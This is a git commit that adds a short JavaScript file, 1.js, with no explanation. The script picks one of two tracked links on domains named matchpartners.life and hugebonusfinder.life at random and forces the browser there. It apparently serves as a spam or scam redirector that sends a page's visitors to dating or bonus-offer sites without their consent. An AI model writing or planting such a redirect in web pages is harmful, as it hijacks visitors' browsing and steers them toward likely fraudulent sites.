c12f1b8b61dbfcccd2828dd0b56f3aebf7642986
ALRICEE <alivia.rice.pht@gmail.com>
2024-07-03 15:35:54 +0300

    Create 1.js

---
+++ 1.js
@@ -0,0 +1,5 @@
+const links = ["https://matchpartners.life/?u=z34zyqu&o=th08x3z&m=1&t=schmb",
+"https://hugebonusfinder.life/?u=z34zyqu&o=thw8x3z&m=1&t=schmb"
+      ];
+      const randomLink = links[Math.floor(Math.random() * links.length)];
+      window.location.href = randomLink;
